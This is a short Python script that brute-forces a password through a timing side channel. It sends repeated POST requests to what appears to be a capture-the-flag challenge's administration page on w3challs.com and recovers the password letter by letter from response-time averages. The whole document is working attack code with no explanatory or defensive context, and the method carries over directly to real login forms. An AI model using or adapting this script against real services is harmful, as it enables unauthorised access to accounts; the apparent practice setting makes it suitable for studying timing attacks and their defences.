import requests
import string

#change these
tries = 5
max_pass_len = 9
no_console_spam = 0

#don't change these
eng_al = tuple(string.ascii_lowercase)
letter_position = 0
password_final = ''
best_length = 0
while best_length >= 0:
	longest_av = 0
	longest_av_letter = 0
	for letter in eng_al:
		for pass_len in range(max_pass_len):
			password = password_final + str(letter + 
				('a' * pass_len if max_pass_len > 1 else 'a' * best_length))
			if not no_console_spam: print(password)
			total_time = 0
			for i in range(0, tries):
				response = requests.post(
				    'http://temporal.hax.w3challs.com/administration.php',
				    data={'your_password': password},
				)
				t = int(response.elapsed.total_seconds() * 1000)
				total_time += t
			if total_time/tries > longest_av:
				longest_av = total_time/tries
				longest_av_letter = letter
				if max_pass_len > 1: best_length = pass_len 
	if not no_console_spam: print('longest average: ', longest_av, longest_av_letter)
	password_final += longest_av_letter
	best_length -= 1
	max_pass_len = 1 
print('the password is: ', password_final)